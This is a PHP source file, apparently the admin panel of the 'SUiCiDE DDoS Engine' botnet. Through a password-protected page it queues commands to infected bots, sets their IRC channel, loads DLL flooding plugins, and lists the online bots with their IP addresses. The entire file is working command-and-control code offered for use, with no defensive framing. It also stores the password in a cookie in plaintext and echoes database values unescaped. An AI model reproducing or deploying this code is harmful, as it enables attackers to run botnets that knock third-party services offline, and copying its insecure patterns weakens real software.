<?
/*************************************

     SUiCiDE DDoS Engine
     module: index.php
     (c) Cr4sh
     www.cr4sh.h15.ru

**************************************/

// логин
$user = "admin";

// пароль
$pass = "admin";

// врем€, по истечении которго, неотвечающий бот удал€е÷÷а из списка
$bot_timeout = 120;
// частота обновлени€ страницы
$refresh_rate = 15;
//_______________________________

$luser = @$_POST['user'];
$lpass = @$_POST['pass'];
$login = @$_POST['login'];

$refer = $_SERVER["SCRIPT_NAME"];

if ($login) {
    Sleep(1);
    if ($luser == $user && $lpass == $pass)
    {
        setcookie("logined", $pass);
    } else {
        die("<font color=#DF0000>Login error</font>");
    }
} else {
    $logined = @$_COOKIE['logined'];
    if ($logined != $pass)
    {
?>

 <form action=<?=$refer?> method=POST>
 user: <input type=text name=user><br>
 pass: <input type=password name=pass><br><br>
 <input type=submit name=login value=login>
 </form>

<?
        exit;
    }
}

   include "options.php";
   global $mysql;
// _____________________________________________________________________________
// Connect to MySQL server

    if (@!mysql_connect($mysql['host'], $mysql['user'], $mysql['pass']))
         die("Ops! Cant connect to MySQL server.");

    if (@!mysql_select_db($mysql['dbname']))
         die("mysql_select_db() error.");

    $irc_update  = addslashes($_POST['irc_update']);
    $update      = addslashes($_POST['update']);
    $command     = addslashes($_POST['command']);
    $nick        = addslashes($_POST['nick']);
    $bnum        = intval($_POST['bnum']);
    $newplugin   = addslashes($_POST['newplugin']);
    $deltask     = addslashes($_GET['deltask']);
    $delplugin   = addslashes($_GET['delplugin']);

    if ($update)
    {
         if (!$nick) $nick = "mass";

         $r = mysql_query("select nick from tasks where nick='$nick'");

         if (mysql_num_rows($r)>0)
         {
              mysql_query("update tasks set command='$command', bnum='$bnum', executed=0 where nick='$nick'");
         } else mysql_query("insert into tasks values ('$nick', '$command', '$bnum', '0')");
    }
    else if ($irc_update)
    {
         $irchost = addslashes($_POST['irchost']);
         $ircport = addslashes($_POST['ircport']);
         $ircchan = addslashes($_POST['ircchan']);

         if ($irchost && $ircport && $ircchan)
         {
               $ircport = intval($ircport);
               $command = "irc $irchost $ircport $ircchan";

               $r = mysql_query("select nick from tasks where nick='mass'");

               if (mysql_num_rows($r)>0)
               {
                     mysql_query("update tasks set command='$command', bnum=0, executed=0 where nick='mass'");
               } else mysql_query("insert into tasks values ('mass', '$command', 0, 0)");
               mysql_query("update irc set irchost='$irchost', ircport='$ircport'");
         } else die("Enter host, port and channel");
    }
    else if ($deltask)
    {
         mysql_query("delete from tasks where nick='$deltask'");
    }
    else if ($newplugin)
    {
         $plugin = addslashes($_POST['plugin']);

         if ($plugin && file_exists("../$plugin"))
         {
              mysql_query("insert into plugins values ('$plugin')");
              $r = mysql_query("select * from tasks where nick='mass'");

              if (mysql_num_rows($r)>0)
              {
                    mysql_query("update tasks set command='updateplugins' where nick='mass'");
              } else mysql_query("insert into tasks values ('mass', 'updateplugins')");
         } else die("Plugin not found, it must exists in the same dir with flood.php");
    }
    else if ($delplugin)
    {
         mysql_query("delete from plugins where name='$delplugin'");
         $r = mysql_query("select nick from tasks where nick='mass'");

         if (mysql_num_rows($r)>0)
         {
              mysql_query("update tasks set command='delplugin $delplugin' where nick='mass'");
         } else mysql_query("insert into tasks values ('mass', 'delplugin $delplugin')");
    }
    $r = mysql_query("select * from tasks where nick='mass'");
    if (mysql_num_rows($r)>0)
    {
          $command = mysql_result($r, 0, 1);
    }
?>

 <html>
 <head>
 <META HTTP-EQUIV="Refresh" CONTENT="<?=$refresh_rate?>; URL=<?=$refer?>">
 <LINK href=style.css type=text/css rel=StyleSheet>
 </head>
 <body>
 <script>
 </script>
 <h2>Configuring DDoS bots:</h2>
 <a href=<?=$refer?>>REFRESH</a><p>
 <b>loadable plugins:</b>
 <table width=30%>
 <tr bgcolor=#000000><td align=center><font color=#bbbbbb>Name</font></td>
 <td align=center><font color=#bbbbbb>Delete</font></td></tr>

<?
    $r = mysql_query("select * from plugins");
    for ($i = 0; $i < mysql_num_rows($r); $i++)
    {
         echo "<tr bgcolor=#d9d9d9><td align=center>".mysql_result($r, $i, 0)."</td>"
             ."<td align=center>[<a href=$refer?delplugin=".mysql_result($r, $i, 0).">X</a>]</td></tr>";
    }
?>

 </table>
 <form action=<?=$refer?> method=POST>
 <b>add new plugin:</b><br>
 Dll Name (it must exists in the same dir. vith flood.php)<br>
 <input type=text name=plugin>
 <input type=submit name=newplugin value=update>
 <hr>

<?
    $r = mysql_query("select * from irc");

    if (mysql_num_rows($r)==1)
    {
         $f = mysql_fetch_array($r);
         $irchost = $f['irchost'];
         $ircport = $f['ircport'];
    }
?>

 <form action=<?=$refer?> method=POST>
 <b>IRC client settings:</b><br>
 host: <input type=text name=irchost value="<?=$irchost ?>">
 port: <input type=text name=ircport value="<?=$ircport ?>"><p>
 chan: <input type=text name=ircchan value="<?=$ircchan ?>">
 <input type=submit value=update name=irc_update>
 </form><hr>
 <form action=<?=$refer?> method=POST name=post>
 <b>current mass command is:</b><br>
 cmd: <input type=text name=command>
 nick: <input type=text name=nick>
 execute on <input type=text name=bnum value=0 size=4> bots (0 - all)
 <input type=submit name=update value=update>
 </form>
 <b>all commands:</b>
 <table width=50%>
 <tr bgcolor=#000000><td align=center><font color=#bbbbbb>Nick</font></td>
 <td align=center><font color=#bbbbbb>Command</font></td>
 <td align=center><font color=#bbbbbb>Executions</font></td>
 <td align=center><font color=#bbbbbb>Allready executed</font></td>
 <td align=center><font color=#bbbbbb>Delete</font></td></tr>

<?
    $r = mysql_query("select * from tasks");
    $rows = mysql_num_rows($r);
    for ($i=0; $i<$rows; $i++)
    {
         $f = mysql_fetch_array($r);
         if ($f['bnum'] == 0) $f['bnum'] = "--";
         if ($f['bnum'] == $f['executed']) $f['executed'] .= " <small>(done)</small>";
         echo "<tr bgcolor=#d9d9d9><td align=center>".$f['nick']."</td>"
             ."<td align=center>".$f['command']."</td>"
             ."<td align=center>".$f['bnum']."</td>"
             ."<td align=center>".$f['executed']."</td>"
             ."<td align=center>"
             ."[<a href=$refer?deltask=".$f['nick'].">X</a>]</td></tr>";
    }
?>

 </table><hr><b>bot's online:</b>
 <table width=70%>
 <tr bgcolor=#000000><td><font color=#bbbbbb>Nick</font></td>
 <td><center><font color=#bbbbbb>IP adress</font></td>
 <td><center><font color=#bbbbbb>Last access time</font></td>
 <td><center><font color=#bbbbbb>last command</font></td>
 <td><center><font color=#bbbbbb>info</font></td></tr>

<?
    $r = mysql_query("select * from stat order by nick");
    $rows = mysql_num_rows($r);
    for ($i=0; $i<$rows; $i++)
    {
         $in = $rows - $i - 1;
         $f = mysql_fetch_array($r);
         $last = time() - intval(mysql_result($r, $in, 2));
         if ($last > $bot_timeout)
         {
              mysql_query("delete from stat where nick='".mysql_result($r, $in, 0)."'");
              mysql_query("delete from tasks where nick='".mysql_result($r, $in, 0)."'");
              continue;
         }
         $n = mysql_result($r, $in, 0);
         $info = mysql_result($r, $in, 4);
         $info = str_replace(";", "\\n", $info);
         echo "<tr bgcolor=#d9d9d9><td>"
             ."<a href=\"javascript:document.post.nick.value = '$n';document.post.command.focus();\">$n</a></td>"
             ."<td><center>".mysql_result($r, $in, 1)."</td>"
             ."<td><center>".$last." seconds ago</td>"
             ."<td><center>".mysql_result($r, $in, 3)."</td>"
             ."<td><center><a href=\"javascript:alert('$info');\">show info</a></td></tr>";
    }
    echo "</table><br><b>total bots: </b>$rows<br><b>total commands:</b>";
?>

</body>
</html>